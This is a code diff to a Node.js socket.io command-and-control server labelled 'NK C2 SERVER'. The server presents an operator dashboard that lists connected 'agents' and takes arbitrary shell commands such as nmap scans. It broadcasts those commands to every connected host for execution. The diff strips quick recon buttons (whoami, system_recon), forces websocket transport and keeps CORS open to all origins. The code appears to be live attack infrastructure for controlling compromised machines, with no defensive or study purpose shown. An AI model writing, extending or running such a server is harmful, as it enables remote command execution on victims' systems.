@@ -1,5 +1,4 @@
-
-/* NK C2 SERVER v43.1 - FIXED DEPLOYMENT SYNTAX */
+/* NK C2 SERVER v43.5 - BROADCAST FIXED */
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -16,7 +15,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>NK C2 // COMMAND CENTER</title>
+        <title>NK C2 // WARLORD SERVER</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <script src="/socket.io/socket.io.js"></script>
         <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
@@ -28,7 +27,7 @@ app.get('/', (req, res) => {
     </head>
     <body class="h-screen flex flex-col p-4 overflow-hidden">
         <header class="flex justify-between items-center border-b border-green-900 pb-2 mb-4">
-            <h1 class="text-xl font-bold tracking-widest text-green-500">NK C2 // WARLORD SERVER</h1>
+            <h1 class="text-xl font-bold tracking-widest text-green-500">NK C2 // WARLORD SERVER v43.5</h1>
             <div id="status" class="text-xs px-2 py-1 border border-green-500 rounded bg-green-900/20">CONNECTING...</div>
         </header>
 
@@ -56,18 +55,12 @@ app.get('/', (req, res) => {
                          <input id="cmdInput" type="text" placeholder="ENTER SHELL COMMAND (e.g. nmap -F google.com)" class="flex-1 bg-gray-900 border border-green-900 text-green-500 p-2 text-xs focus:outline-none">
                          <button onclick="sendCommand()" class="px-4 py-2 bg-green-900/30 text-green-400 border border-green-700 hover:bg-green-700 hover:text-white font-bold text-xs">EXECUTE</button>
                     </div>
-                    <div class="flex gap-2 text-[10px] text-gray-500">
-                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('whoami')">[whoami]</span>
-                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('nmap -F localhost')">[nmap_local]</span>
-                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('ls -la')">[ls]</span>
-                        <span class="cursor-pointer hover:text-green-300" onclick="setInput('system_recon')">[recon]</span>
-                    </div>
                 </div>
             </div>
         </main>
 
         <script>
-            const socket = io();
+            const socket = io({ transports: ['websocket'] });
             const logsEl = document.getElementById('logs');
             const agentListEl = document.getElementById('agentList');
             const statusEl = document.getElementById('status');
@@ -99,16 +92,11 @@ app.get('/', (req, res) => {
             socket.on('log', (data) => {
                 const div = document.createElement('div');
                 div.className = "border-l border-green-900 pl-2 text-green-300 hover:bg-green-900/10";
-                // Handle object or string
                 let content = typeof data === 'string' ? data : (data.output || JSON.stringify(data));
                 div.innerText = \`[\${new Date().toLocaleTimeString()}] \${content}\`;
                 logsEl.appendChild(div);
                 logsEl.scrollTop = logsEl.scrollHeight;
             });
-
-            function setInput(cmd) {
-                document.getElementById('cmdInput').value = cmd;
-            }
 
             function sendCommand() {
                 const cmd = document.getElementById('cmdInput').value;
@@ -116,13 +104,6 @@ app.get('/', (req, res) => {
                 if(!cmd) return;
                 
                 socket.emit('cmd', { cmd, target });
-                // Optimistic Log
-                const div = document.createElement('div');
-                div.className = "text-yellow-500 font-bold mt-1";
-                div.innerText = \`>>> \${cmd} -> \${target}\`;
-                logsEl.appendChild(div);
-                logsEl.scrollTop = logsEl.scrollHeight;
-                
                 document.getElementById('cmdInput').value = '';
             }
 
@@ -139,7 +120,8 @@ const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*" },
     pingTimeout: 30000,
-    pingInterval: 10000
+    pingInterval: 10000,
+    transports: ['websocket']
 }); 
 
 // PERSISTENT STATE
@@ -148,7 +130,7 @@ const agentsMap = new Map();
 io.on('connection', (socket) => {
     const clientIp = socket.handshake.address.replace('::ffff:', '');
     
-    // Broadcast Status on Connect
+    // Broadcast Status
     socket.emit('status', { agents: Array.from(agentsMap.values()) });
 
     socket.on('identify', (data) => {
@@ -168,6 +150,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('cmd', (data) => {
+        // BROADCAST TO ALL SOCKETS
         io.emit('exec', data); 
         io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd} -> ${data.target || 'ALL'}`);
     });
@@ -189,7 +172,6 @@ io.on('connection', (socket) => {
                 agent.status = 'OFFLINE';
                 agentsMap.set(id, agent);
                 io.emit('status', { agents: Array.from(agentsMap.values()) });
-                io.emit('log', `[SYSTEM] AGENTE CAIU: ${id}`);
                 break;
             }
         }
